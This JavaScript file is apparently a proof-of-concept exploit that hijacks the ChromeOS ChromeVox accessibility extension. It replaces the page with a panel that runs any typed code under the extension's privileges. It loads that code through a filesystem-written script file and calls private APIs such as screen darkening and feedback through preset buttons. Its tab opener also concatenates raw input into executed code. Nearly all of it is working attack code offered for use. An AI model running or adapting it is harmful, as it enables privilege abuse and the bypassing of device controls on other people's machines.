onerror = alert;

const voxTemplate = `
<div id="vox_code_runner">
  <h1>eval as ChromeVox</h1>
  <h2>This is just a proof of concept, below are chromevoxes permissions</h2>
  <p>Permissions: ${chrome.runtime.getManifest().permissions.join(', ')}</p>
  <p>Extension ID: ${chrome.runtime.id}</p><hr>
  <textarea id="code_input" style="width: 70%; height: 150px; resize: both;"></textarea>
  <button id="code_run">Run</button><hr>
  <button id="show_feedback">Show Feedback</button><br>
  <button id="funny_button_pls_click">You should totally click this nothing will happen trust me</button><br>
  <button id="get_battery">Get Battery status</button><br>
  <textarea id="tab_open_url"></textarea><button id="tab_opener">Open URL in new tab</button><br>
</div>
`;

class Vox {
  static getFS() {
    return new Promise(resolve => {
      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
    });
  }

  static async writeFile(fs, filename, data) {
    return new Promise((resolve, reject) => {
      fs.root.getFile(filename, { create: true }, entry => {
        entry.remove(() => {
          fs.root.getFile(filename, { create: true }, entry2 => {
            entry2.createWriter(writer => {
              writer.onwriteend = () => resolve(entry2.toURL());
              writer.onerror = reject;
              writer.write(new Blob([data]));
            });
          });
        });
      });
    });
  }

  static async runCode(code) {
    const fs = await Vox.getFS();
    const url = await Vox.writeFile(fs, "src.js", code);

    // Remove existing script if any
    const oldScript = document.getElementById("evaluate_elem");
    if (oldScript) oldScript.remove();

    // Append new script with src set to file URL
    const script = document.createElement("script");
    script.id = "evaluate_elem";
    script.src = url;
    document.body.appendChild(script);
  }

  static activate() {
    document.write(voxTemplate);
    document.close();

    document.getElementById("code_run").addEventListener("click", async () => {
      const code = document.getElementById("code_input").value;
      await Vox.runCode(code);
    });
    document.getElementById("show_feedback").addEventListener("click", async () => {
      await Vox.runCode(`chrome.feedbackPrivate.openFeedback('quickoffice');`);
    });
    document.getElementById("funny_button_pls_click").addEventListener("click", async () => {
      await Vox.runCode(`chrome.accessibilityPrivate.darkenScreen(true);`);
    });
    document.getElementById("get_battery").addEventListener("click", async () => {
      await Vox.runCode(`chrome.accessibilityPrivate.getBatteryDescription(alert);`);
    });
    document.getElementById("tab_opener").addEventListener("click", async () => {
      const tabopenurl = document.getElementById("tab_open_url").value;
      await Vox.runCode(`chrome.tabs.create({}, () => { chrome.tabs.update({url: "`+tabopenurl+`"}); chrome.tabs.reload(); });`);
    });
  }
}
window.onload = () => {
  Vox.activate();
};
